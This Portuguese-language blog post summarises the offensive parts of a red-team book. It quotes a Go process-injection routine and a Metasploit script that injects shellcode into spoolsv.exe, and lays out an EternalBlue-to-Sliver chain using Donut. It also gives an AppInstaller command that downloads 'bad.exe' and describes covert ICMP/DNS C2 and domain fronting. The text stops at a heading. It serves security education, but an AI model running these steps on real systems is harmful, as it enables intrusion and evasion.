### Offensive Key-points do livro https://www.amazon.com.br/Adversarial-Tradecraft-Cybersecurity-real-time-computer/dp/1801076200

A ideia aqui é, depois de ler o livro, eu vi muitos pontos importantes que valem a pena serem passados a diante de forma direta e resumida para que o futuro leitor possa ter conhecimento disso e se aprofundar no assunto caso desejar. 

O livro aborda as fases de um "Conflito Cibernetico" (como o autor diz), que é basicamente a interação dos times de ataque e defesa fazendo simulações de conflitos do mundo real. No livro existem varias taticas usadas por blue e red teams levando em consideração as experiencias do autor, que são muito boas por sinal. 

Essa leiturame deu uma visão mais ampla sobre tema e com certeza pode ajudar outras pessoas também. Por isso eu decidi separar as partes que eu julguei mais importantes para o lado offensivo.


- [Preparing for Battle](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#preparing-for-battle)
	- [Essential Considerations](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#essential-considerations)
		- [Long-term planning](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#long-term-planning)
		- [Operational planning](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#operational-planning-and-opsec)
		- [Scanning and Exploitation](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#scanning-and-exploitation)
		- [Payload development](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#payload-development)

- [Invisible is Best (Operating in Memory)](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#invisible-is-best-operating-in-memory)
	- [Gaining the advantage](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#gaining-the-advantage)
		- [Process injection](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#process-injection)

- [Blending In](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#blending-in)
	- [Persistence Options](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#persistence-options)
		- [LOLbins](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#lolbins)
		- [Executable file infection](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#executable-file-infection)
	- [Covert command and control channels](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#covert-command-and-control-channels)
		- [ICMP C2](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#icmp-c2)
		- [DNS C2](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#dns-c2)
		- [Domain fronting](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#domain-fronting)
		- [Combining offensive techniques](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#combining-offensive-techniques)			

- [Active Manipulation](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#active-manipulation)
	- [Clearing logs](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#clearing-logs)
	- [Hybrid approach](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#hybrid-approach)
	- [Rootkits](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#rootkits)

- [Real-Time Conflict](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#real-time-conflict)
	- [Situational awareness](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#situational-awareness)
		- [Clear the Bash history](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#clear-the-bash-history)
		- [Abusing Docker](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#abusing-docker)
	- [Gleaning operational information](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#gleaning-operational-information)
		- [Keylogging](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#keylogging)
		- [Screeshot spy](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#screeshot-spy)
		- [Getting passwords](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#getting-passwords)
		- [Searching files for secrets](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#searching-files-for-secrets)
		- [Backdooring password utilities](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#backdooring-password-utilities)
		- [PAM modules](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#pam-modules)

- [Pivoting](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#pivoting)
	- [SSH agent hijacking](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#ssh-agent-hijacking)
	- [SSH ControlMaster hijacking](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#ssh-controlmaster-hijacking)
	- [RDP hijacking](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#rdp-hijacking)

- [The Research Advantage](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#the-research-advantage)
	- [Creative Pivoting](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#creative-pivoting)

- [Clearing the Field](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#clearing-the-field)
	- [Exfiltration](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#exfiltration)
		- [Protocol tunneling](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#protocol-tunneling)
	- [Anonymity networks](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#anonymity-networks)
		- [Public networks](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#public-networks)
		- [Custom private anonymity networks](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#custom-private-anonymity-networks)
	- [Ending the operation](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#ending-the-operation)
		- [Taking down infrastructure](https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#taking-down-infrastructure)					



## Preparing for Battle
>___


### Essential Considerations

#### Long-term planning

O planejamento de longo prazo é um dos mais importantes que seu grupo pode fazer. De modo geral, um plano de longo prazo pode ser qualquer coisa que ajude você a se preparar para um compromisso operacional durante seu tempo de inatividade. Você também pode iterar esses planos ao longo do tempo, como adicionar ou remover marcos conforme uma operação se desenvolve e novas necessidades surgem.

Com o tempo, esses planos maiores podem ser divididos em objetivos menores para ajudar a equipe a assimilar os projetos individuais envolvidos e a cronometrar as diferentes tarefas envolvidas. Esses objetivos menores ajudarão a determinar se o progresso está sendo feito de acordo com o planejado e dentro do cronograma. 

O tempo é um dos seus recursos mais preciosos em termos de economia e planejamento, e é por isso que iniciar o planejamento mais cedo pode ajudá-lo a lidar com grandes tarefas e potenciais perdas de tempo. Você vai querer usar seu tempo de inatividade para desenvolver ferramentas e automações para tornar suas práticas operacionais mais rápidas.

O planejamento de longo prazo deve envolver a criação de projetos, que então abrangem o desenvolvimento de infraestrutura, ferramentas ou melhorias de habilidades que você deseja disponibilizar ao grupo.

Planos de contingência devem estar disponíveis caso os objetivos não estejam sendo alcançados. Isso está enraizado em nosso princípio de inovação: se nossa estratégia for descoberta, perderemos nossa vantagem, portanto, devemos estar preparados para mudar de direção em nossas operações nessa situação. Ao realizar seu planejamento de longo prazo, considere reservar tempo para pesquisas não especificadas, desenvolvimento de ferramentas ou até mesmo refinamento de ttp's.


#### Operational planning (and opsec)

O planejamento operacional é tudo o que ajuda os operadores a se prepararem e navegarem por um engajamento futuro. Diferente do long-term planning, o planejamento operacional também pode ser metas e princípios gerais de uma missão a curto prazo, como uma regra que os operadores devem seguir ou detalhes mais especificos sobre alguma ttp. O planejamento operacional pode ser genérico para todas as operações ou específico para um engajamento alvo.

Planos personalizados devem ser elaborados por engajamento, incluindo metas gerais e considerações especiais para aquela operação. Em operações reais, isso normalmente envolveria muito reconhecimento, garantindo um bom entendimento das tecnologias alvo.

Manter metas operacionais e runbooks é uma maneira de preparar sua equipe para a alta pressão e o ritmo acelerado do conflito cibernético. Durante esses compromissos, as equipes criam runbooks para orientar ações e registrar as descobertas.

Esses runbooks servem como registros abrangentes, documentando vários procedimentos e táticas empregadas durante os compromissos. Eles descrevem as etapas que a equipe toma, as vulnerabilidades que exploram e etc. Em essência, os runbooks são o manual para esses exercícios de segurança. Os runbooks podem ser separados por fases da operação também, tipo o reconhecimento, explorarção ou pós-exploração.

Você também deve se planejar para o caso de a operação tomar um rumo inesperado ou favorecer o oponente. Para o ataque, isso significa planejar como responderemos se a campanha for descoberta, nossas ferramentas e infraestrutura forem expostas publicamente ou mesmo nossos operadores forem identificados. É de vital importância considerar como o ataque irá se infiltrar e sair do ambiente alvo após atingir seu objetivo. Da mesma forma, o ataque deve considerar como seria uma resposta bem-sucedida da defesa e quando optará por sair do ambiente ou gastar mais recursos para se reengajar.

Isso é frequentemente considerado "program security" (Network Attacks and Exploitation: A Framework, Matthew Monte, page 110). Como Monte descreve, "A program security é o princípio de conter os danos causados durante o comprometimento de uma operação.


#### Scanning and Exploitation

Devido à complexidade dos sinalizadores de linha de comando das ferramentas, prefiro automatizar a sintaxe dessas ferramentas durante o tempo de inatividade para facilitar o uso operacional. Para o Nmap, essa varredura pode se parecer com isso, intitulada varredura turbonmap:

```bash
$ alias turbonmap='nmap -sS -Pn --host-timeout=1m --max-rtt-
timeout=600ms --initial-rtt-timeout=300ms --min-rtt-timeout=300ms
--stats-every 10s --top-ports 500 --min-rate 1000 --max-retries 0 -n
-T5 --min-hostgroup 255 -oA fast_scan_output -iL'

$ turbonmap 192.168.0.1/24
```

A varredura Nmap anterior é altamente agressiva e barulhenta na rede. Em roteadores domésticos mais fracos, ela pode sobrecarregar o gateway, portanto, conhecer o ambiente e adaptar as varreduras a ele é fundamental.

A lógica para isso vem, em grande parte, da publicação no blog de Jeff McJunkin, onde ele explora maneiras de acelerar grandes varreduras do Nmap. O objetivo dessa automação é mostrar como é fácil encadear ferramentas simples com um pouco de script bash:

```bash
$ sudo masscan 192.168.0.1/24 -oG initial.gnmap -p 7,9,13,21-23,25-26,
37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,
443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,
1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,
3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,
5631,5666,5800,5900,6000-6001,6646,7070,8000,8008-8009,8080-8081,8443,
8888,9100,9999-10000,32768,49152-49157 --rate 10000

$ egrep '^Host: ' initial.gnmap | cut -d" " -f2 | sort | uniq > alive.
hosts

$ nmap -Pn -n -T4 --host-timeout=5m --max-retries 0 -sV -iL alive.hosts
-oA nmap-version-scan
```

Vale a pena resaltar que esses scans muito barulhentos não são indicados caso a furtividade seja a prioridade para a operação.

Além da varredura e exploração básicas, a equipe ofensiva deve conhecer os exploits mais populares ou os exploits que funcionarão de forma confiável em vulnerabilidades populares de 0-day ou n-day. Isso vai além da varredura de vulnerabilidades, preparando diversos exploits comuns com implementações e payloads testados.

Esses exploits também devem ser automatizados ou programados com sua sintaxe preferida de exploração e já preparados para "dropar" um next-stage, como um stager de c2 ou algo parecido. E também o next-stage droper deve ser compilado dinamicamente por alvo ou host...  Usar payloads geradas dinamicamente por alvo ajudará a reduzir a capacidade detecção. De preferência, a exploração carregará esse next-stage diretamente na memória, para evitar o máximo possível de logs forenses.

Os scripts de exploração devem ser bem testados em várias versões dos sistemas operacionais de destino e, quando necessário, devem considerar versões que não suportam ou que são potencialmente instáveis.


#### Payload development

O desenvolvimento de ferramentas e a ofuscação são funções importantes para qualquer equipe ofensiva. Frequentemente, equipes ofensivas exigirão payloads especiais para sistemas alvo que utilizem APIs de baixo nível e habilidades de programação.

Ofuscar qualquer payload ou artefato que esteja indo para o ambiente de destino se enquadraria nessa função de payload development. Ofuscadores ou packers de executáveis também devem estar preparados para proteger payloads que vão para o ambiente de destino.

A infraestrutura de C2 é outro componente crítico na maioria das operações ofensivas... as estruturas de C2 frequentemente incorporam tantos recursos diferentes que decidir quais capacidades você deseja para sua operação se torna crucial na fase de planejamento. Para ajudar os planejadores a navegar pelos vários recursos dos frameworks C2 de código aberto, você pode considerar navegar pela The C2 Matrix, uma coleção de muitos frameworks C2 públicos modernos.

Outro recurso que você pode considerar é a capacidade de carregar módulos personalizados diretamente na memória. Ao carregar recursos adicionais diretamente na memória, você pode impedir que o defensor tenha acesso a esses recursos. Ou talvez você queira protocolos C2 personalizados para ofuscar as comunicações e a execução entre o implante e o servidor de comando. Há um hobby interessante entre desenvolvedores de C2, no qual eles encontram outros protocolos normais nos quais podem ocultar suas comunicações C2, conhecido como Covert C2. Ao ofuscar seu tráfego com Covert C2, operadores ofensivos podem fingir ser um protocolo de comunicação diferente e benigno na rede.

Uma abordagem avançada para isso é chamada de domain fronting, em que agentes ofensivos podem abusar de Content Delivery Networks (CDNs), como Tor ou Fastly, para rotear tráfego para hosts confiáveis nas redes CDN, que, posteriormente, serão roteados para a infraestrutura do invasor.

Algo que você pode considerar ao planejar seu suporte a C2 são múltiplas infecções simultâneas usando diferentes frameworks C2 em uma rede alvo. Muitas vezes, você deseja que esses diferentes frameworks de implante sejam totalmente desacoplados, de modo que a descoberta de um não leve à descoberta de outro. É uma estratégia popular tornar um desses implantes um implante operacional e o outro uma forma de persistência de longo prazo, o que pode gerar mais implantes operacionais caso você perca uma sessão operacional

- https://jeffmcjunkin.wordpress.com/2018/11/05/masscan/
- https://github.com/Tib3rius/AutoRecon
- https://github.com/gen0cide/gscript
- https://github.com/burrowers/garble
- https://howto.thec2matrix.com/
- https://fatrodzianko.com/2020/05/11/covenant-c2-infrastructure-with-azure-domain-fronting/


## Invisible is Best (Operating in Memory)
>___


Neste capítulo, examinaremos diversas técnicas para evitar artefatos forenses comuns e, assim, evitar grande parte da análise forense tradicional pós-comprometimento... com foco nas técnicas de injeção de processo e as técnicas em memória que evitam detecção.

### Gaining the advantage

#### Process injection

Injeção de processo é uma técnica que envolve alocar shellcode na memória e executá-lo sem usar o carregador executável normal do sistema. Os invasores frequentemente fazem isso para mover seu código em execução ativamente para um local da memória que não seja facilmente associado à execução original do código. 

Embora a técnica geral exista em todos os principais sistemas operacionais em diferentes formas, a injeção de processo é mais comum no Windows devido aos múltiplos métodos e chamadas de API que a suportam.
Existem muitos tipos diferentes de injeção de processo nos vários sistemas operacionais e a categoria geral inclui muitas subtécnicas, como diferentes métodos, estruturas ou argumentos usados para carregar e executar shellcode. 

Existem muitas técnicas diferentes para alocar e executar shellcode em um processo-alvo, apenas no Windows. O MITRE, por exemplo, lista mais de 11 subtécnicas diferentes em injeção de processo, abrangendo desde injeção de DLL, process doppelganging, process hollowing e thread execution hijacking.

Frequentemente, as técnicas envolvem escrever o shellcode em um local específico da memória e, em seguida, iniciar sua execução de alguma forma.

Podemos ver a técnica CreateRemoteThread ilustrada de forma muito clara em Go, no programa Needle de Vyrus001 em https://github.com/vyrus001/needle/blob/6b9325068755b55adda60cf15aea817cf508639d/windows.go#L24

```go
// Open remote process with kernel32.OpenProcess
openProc, _ := kernel.FindProc("OpenProcess")
remoteProc, _, _ := openProc.Call(0x0002|0x0400|0x0008|0x0020|0x0010,
uintptr(0), uintptr(int(pid)),)

// Allocate memory in remote process with kernel32.VirtualAllocEx
allocExMem, _ := kernel.FindProc("VirtualAllocEx")
remoteMem, _, _ := allocExMem.Call(remoteProc, uintptr(0),
uintptr(len(payload)), 0x2000|0x1000, 0x40,)

// Write shellcode to remote process using kernel32.WriteProcessMemory
writeProc, _ := kernel.FindProc("WriteProcessMemory")
writeProcRetVal, _, _ := writeProc.Call(remoteProc, remoteMem,
uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)),
uintptr(0),)

// Start a thread on the payload with kernel32.CreateRemoteThread
createThread, _ := kernel.FindProc("CreateRemoteThread")
status, _, _ := createThread.Call(remoteProc, uintptr(0), 0, remoteMem,
uintptr(0), 0, uintptr(0),)
```

Nesta função, ficam claros os quatro passos básicos que devem ser seguidos para que esta técnica de injeção funcione. Primeiro, obtemos um identificador para um processo remoto. Em seguida, alocamos memória nesse processo, gravamos nosso shellcode nesse local de memória e, por fim, iniciamos uma nova thread nesse local no processo remoto.

Se você quiser explorar técnicas alternativas de injeção de código em Go, Russel Van Tuyrl reuniu este excelente repositório de várias técnicas de exemplo em https://github.com/Ne0nd0g/go-shellcode. Este repositório inclui exemplos como CreateFiber, CreateProcessWithPipe, CreateThreadNative e RtlCreateUserThread, para citar alguns.

No Metasploit Framework também existe o shellcode_inject, que usa seu módulo Ruby reflective_dll_injection e por fim, chama a função inject_into_process internamente: https://github.com/rapid7/metasploit-framework/blob/0f433cf2ef739db5f7865ba4d5d36f301278873b/lib/msf/core/post/windows/reflective_dll_injection.rb#L25.

Dito isso, usaremos uma ferramenta chamada Donut, um canivete suíço e um
projeto que pode carregar PEs e DLLs na memória usando um loader embutido personalizado. Isso significa que podemos usar PEs ou DLLs arbitrários como nosso payload de implante, que será incorporada em um position-independent shellcode, que podemos usar facilmente na maioria dos locais arbitrários de injeção de shellcode.

O Donut também nos oferece muitos recursos como compressing, encrypting, patching e
até mesmo a maneira como nosso shellcode sai da execução. Esses recursos são todos considerações muito importantes ao pensar em injeção de processo, pois cada um também pode ser detectado de alguma forma. 

Compressing pode ajudar a manter seu shellcode maleavel, de forma que você não precise injetar binários massivos nos processos. 
Encrypting é um ótimo recurso para proteger seu código em trânsito, ocultando a verdadeira funcionalidade até que ele já esteja em execução na memória. 
Considerações sobre a saída do seu shellcode também são extremamente importantes, para que o processo no qual você está injetando não "crashe", alertando o usuário sobre comportamentos estranhos.

Para fazer isso, vamos envolver nosso second-stage payload em um loader de position-independent shellcode e então injeta-lo num processo assim que tivermos uma sessão. Neste caso, nosso second-stage será o Sliver, que é nosso implante operacional. O motivo pelo qual estamos mudando nossas ferramentas e migrando para um novo processo é na tentativa de dissociar nossas ações e enganar o defensor, para que, se formos descobertos, seja mais difícil criar uma imagem forense do que aconteceu.

No exemplo a seguir, vamos encadear nosso acesso a partir de um ataque de corrupção de memória no exemplo de injeção de processo. Esta série de técnicas manterá todo o nosso código in-memory... Para isso, usaremos o exploit EternalBlue para Initial Access. O EternalBlue é um exploit de corrupção de memória baseado em rede que resulta na execução arbitrária de código.

Embora o exploit MS17-010 EternalBlue seja implementado no Metasploit, acho que um bom repositório para explorar esse exploit é o repositório AutoBlue-MS17-010 em https://github.com/3ndG4me/AutoBlue-MS17-010. Este repositório inclui vários exploits diferentes do EternalBlue que funcionam em várias versões do Windows. O repositório também inclui scripts auxiliares para verificar a vulnerabilidade, gerar código shell e explorá-la sem precisar hospedar um servidor C2 ou listners.

Especificamente, usaremos eternalblue_exploit7.py, pois nosso sistema alvo é um Windows Server 2008. Este exploit também nos dará contexto de execução do SYSTEM para o restante dos nossos ataques, que usaremos process inject nos serviços do sistema posteriormente. 

RC script para implantação de second-stage a partir da sessão Meterpreter que veio através do exploit eternalblue.

```rb
<ruby>
already_run = Array.new
run_single("use post/windows/manage/shellcode_inject")
run_single("set SHELLCODE /path/to/shellcode.bin")
while(true)
	framework.sessions.each_pair do |sid,s|
		session = framework.sessions[sid]
		if(session.type == "meterpreter")
			sleep(2)
			unless already_run.include?(s)
				print_line("starting recon commands on session number #{sid}")
				target_proc = session.console.run_single("pgrep spoolsv.exe")
				session.sys.process.get_processes().each do |proc|
					if proc['name'] == "spoolsv.exe"
						target_proc = proc['pid']
					end
				end
				print_line("targeting process: #{target_proc}")
				run_single("set SESSION #{sid}")
				run_single("set PID #{target_proc}")
				run_single("run")
				already_run.push(s)
			end
		end
	end
end
</ruby>
```

- Uma vez dentro da sessão do Metasploit, carregue este resource file /path/to/auto_inject.rc. Abaixo esta um passo-a-passo basico do attack-chain nesse exemplo de process-injection e in-memory execution:

1. Start the Sliver server and mTLS listeners

2. Generate obfuscated Sliver implants using the Sliver server ```generate --format exe --os windows --arch 64 --mtls [fqdn]:[port]```

3. Generate obfuscated Sliver shellcode by running Donut on the Sliver implant ```$ ./donut ./[SLIVER_PAYLOAD.exe] -a 2 -t -b 3 -e 2 -z 2 -f 1 -o SLIVER_SHELLCODE.bin```

4. Generate Metasploit shellcode using the shell_prep.sh script provided https://github.com/3ndG4me/AutoBlue-MS17-010/blob/master/shellcode/shell_prep.sh

5. Start the Metasploit service using the listener_prep.sh script provided https://github.com/3ndG4me/AutoBlue-MS17-010/blob/master/listener_prep.sh

6. Load auto_inject.rc in Metasploit to automatically deploy our second stage
when we get a session

7. Throw an AutoBlue-MS17-010 exploit with Metasploit shellcode

8. Get a Meterpreter session on our victim; Meterpreter is running in lsass.exe
as SYSTEM from the MS17-010 exploit

9. New Meterpreter sessions kick off the RC script that gets the pid of spoolsv.exe and uses the CreateRemoteThread technique to put our Donut shellcode into that process

10. Donut loader puts the Sliver PE into another new thread of the spoolsv.exe process

11. Get a Sliver session that calls back from the injected process


- https://www.ired.team/offensive-security/code-injection-process-injection/process-injection
- https://github.com/3xpl01tc0d3r/Obfuscator
- https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c
- https://web.archive.org/web/20240313192232/https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html
- https://github.com/unixpickle/gobfuscate
- https://github.com/burrowers/garble
- https://github.com/GhostPack/Seatbelt


## Blending In
>___


Onde antes os invasores evitavam a non-repudiation na memória, agora os defensores têm registros de relacionamentos parent-child, criações remotas de threads ou memória de processos anômalos, por exemplo. Isso significa que os invasores não são necessariamente invisíveis quando operam na memória; pelo contrário, eles podem disparar alertas se a defesa estiver bem instrumentada.

Para combater essa nova correspondência de reação ou mudança de estratégia, os invasores podem tentar se misturar ao ambiente alvo em vez de tentar operar abaixo do radar.

Ao planejar suas enganações, tente ter em mente a complexidade dos sistemas de computador. Ninguém conhece todos os arquivos, processos ou protocolos de um único sistema operacional, muito menos de vários sistemas. A aparência de arquivos críticos do sistema, imitar processos do sistema e protocolos obscuros fará com que as pessoas se questionem antes de encerrar o software do invasor.

Da perspectiva do invasor, conhecer o normal ajuda você a se misturar. Também queremos começar a pensar em planejamento de contingência, de modo que, se nossos implantes forem descobertos, ainda possamos retornar à rede. Como invasores, podemos nos parecer ou até mesmo infectar arquivos críticos do sistema, de modo que a defesa pense duas vezes antes de removê-los.

Neste capítulo, examinaremos diversas ferramentas e técnicas para nos ajudar a inspecionar e personificar ferramentas normais do sistema. Na segunda metade da seção Perspectiva Ofensiva, examinaremos canais de comunicação secretos, como ICMP e DNS. 


### Persistence Options

Até agora, temos operado na memória e contando com exploits para retornar aos nossos sistemas alvo. Nosso nível atual de acesso, da perspectiva do invasor, é extremamente tênue. Isso significa que podemos perder nossas sessões e acesso a qualquer momento, portanto, devemos persistir nosso acesso o mais rápido possível. Nossa persistência deve ser um canal de comunicação de longa distância ou um canal de fallback caso nosso acesso inicial seja perdido.

- LOLbins
- DLL search order hijacking
- Executable file infection
- Covert command and control (C2) channels
- ICMP C2
- DNS C2
- Domain fronting
- Combining offensive techniques


#### LOLbins

LOLbins, ou binários "living off the land", são essencialmente utilitários ou executáveis nativos que vêm por padrão com o sistema operacional e podem ser usados de alguma forma por um invasor.

- Windows https://lolbas-project.github.io/#
- Linux https://gtfobins.github.io/

Outras maneiras pelas quais a defesa pode detectar essas ferramentas, digamos, se os arquivos foram renomeados, é verificando o campo de nome na estrutura IMAGE_EXPORT_DIRECTORY de um PE de destino, que mostrará o nome com o qual o módulo foi compilado, mesmo que o arquivo tenha sido renomeado.

Existem muitos utilitários de sistema padrão para fins de persistência legítima, como serviços, tarefas agendadas e locais de inicialização automática na maioria dos sistemas operacionais. Ainda assim, os invasores devem estar familiarizados com os tradicionais pontos de extensibilidade de inicialização automática, ou locais ASEP, pois geralmente são rápidos e fáceis de usar em caso de emergência.

Um LOLbin popular para persistência indireta e carregamento de código na memória é o
MSBuild que  pode carregar arquivos C# e em seguida, carregar assemblies na memória. Também podemos ver o LOLbin do MSBuild sendo usado para movimentação lateral em algumas situações.

Outro muito usado de forma abusiva era o certutil.exe, que é usado como uma forma de baixar mais ferramentas para o host. Outra maneira menos conhecida de baixar arquivos no Windows 10 é usar o utilitário AppInstaller.exe.

A linha de comando a seguir baixará um arquivo para ```%LOCALAPPDATA%\Packages\
Microsoft.DesktopInstaller_8wekyb3dbbwe\AC\INetCache\```. Depois encerra o AppInstaller com taskkill e por ultimo "unhide" no arquivo quando terminar o download.

```
> start ms-appinstaller://?source=https://example.com/bad.exe &&
timeout 1 && taskkill /f /IM AppInstaller.exe > NUL

> attrib -h -r -s /s /d %LOCALAPPDATA%\Packages\Microsoft.DesktopAppIns
taller_8wekyb3d8bbwe\AC\INetCache\*
```

#### Executable file infection

Existe uma técnica de segurança de computadores mais antiga, conhecida como executable file infection, que envolve a modificação de um arquivo executável de forma que você possa sequestrar sua execução em tempo de execução. 

Analisaremos uma técnica de sequestro de execução notavelmente simples no Windows, conhecida como AddSection. Com essa técnica, o novo código é simplesmente adicionado como uma nova seção ao PE e o ponto de entry point no header do PE é alterado para apontar para essa nova seção. Podemos ver essa técnica em ação no binjection no arquivo inject_pe.go , especificamente na linha 73 (https://github.com/Binject/binjection/blob/da1a50d7013df5067692bc06b50e7dca0b0b428d/bj/inject_pe.go#L73).

Felizmente para nós, o Sliver implementou a biblioteca binject em sua estrutura pós-exploração.


### Covert command and control channels

Quando pensamos em nossos implantes recebendo comandos, frequentemente os imaginamos calling back do ambiente alvo para nossa infraestrutura. Isso ocorre porque as conexões de saída geralmente conseguem atravessar gateways e firewalls de rede com mais facilidade, sem serem bloqueadas ou precisarem de uma tradução de endereço de rede (NAT) especial. Esse fluxo de tráfego de rede é geralmente chamado de shell reverso ou outbound connection. 

Além disso, não queremos necessariamente manter conexões persistentes e longas abertas, pois elas serão mais fáceis de detectar tanto do host quanto da rede. Idealmente, queremos fazer polling ou beacon e enviar solicitações de novos comandos apenas em intervalos variados. Há uma compensação com a frequência das solicitações aqui, mas a ideia geral é que, se você estiver fazendo polling, eles terão que pegá-lo em flagrante, enquanto se for uma conexão persistente, o túnel estará ativo quando eles verificarem com uma ferramenta como o netstat.

Mais recentemente, os invasores passaram a incorporar dados em protocolos de nível superior, como HTTPS ou ICMP, no que é conhecido como um covert command and control
channel. Ele é secreto porque tenta se parecer com outro tipo de tráfego de rede ou um protocolo de rede normal, quando, na verdade, é tráfego malicioso de um invasor.

#### ICMP C2

O ICMP, ou Internet Connected Message Protocol, é um protocolo de camada de rede normalmente usado para testar se os sistemas estão ativos.

Os covert channels do ICMP normalmente funcionam contrabandeando (smuggling) dados arbitrários relacionados ao C2, no campo de dados de um pacote ICMP_ECHO.

- https://github.com/andreafabrizi/prism
- https://github.com/krabelize/icmpdoor
- https://cryptsus.com/blog/icmp-reverse-shell.html


#### DNS C2

O DNS é um dos principais serviços da internet, transformando nomes de domínio legíveis por humanos em endereços IP que as máquinas podem entender.

Os covert channels de DNS são frequentemente usados para sair de redes altamente restritivas ou políticas de firewall, já que o DNS de saída geralmente não é bloqueado para a resolução de nomes necessária.


A aparência desse covert channel em ação é bem simples. Primeiro, o client entra em contato para encontrar o servidor de nomes ou registros NS para o subdomínio C2. Em seguida, o implante fará check-in com esse servidor de nomes malicioso (aqui, ele pode trocar chaves). 
Então,o implante pode solicitar registros TXT para subdomínios, enquanto pesquisa ou verifica o servidor de nomes. As respostas do registro TXT podem conter comandos criptografados básicos, que são então analisados e executados pelo implante. O implante então enviará dados assíncronos de volta ao servidor de nomes codificados como novos subdomínios para resolução.

Atualmente, a implementação de DNS do Sliver verifica a cada segundo, o que
é bastante ruidoso, o que não o torna um ótimo fallback ou protocolo de longa distância se estiver sempre se comunicando na rede. Felizmente podemos ajustar isso.


#### Domain fronting

Outro covert channel C2 popular atualmente é chamado de domain fronting. O domain fronting aproveita as vantagens das redes de distribuição de conteúdo (CDNs), como a Fastly e, no passado, a AWS da Amazon, o GCP do Google, o Azure da Microsoft e a Cloudflare.

Funciona especificando um domínio diferente no cabeçalho do host do que o originalmente especificado na URL da solicitação HTTPS. A solicitação irá para o ponto de extremidade TLS especificado na URL e, se esse host fizer parte de uma CDN compatível com domain fronting, ele resolverá o cabeçalho do host e enviará o tráfego para um aplicativo interno à CDN que corresponde ao cabeçalho do host

- https://beyondbinary.io/articles/domain-fronting-with-metasploit-and-meterpreter/
- https://lmntrix.com/blog/lmntrix-labs-hiding-in-plain-sight-with-reflective-injection-and-domain-fronting/


#### Combining offensive techniques

Agora, vamos encadear algumas das técnicas anteriores para nossa kill chain. 

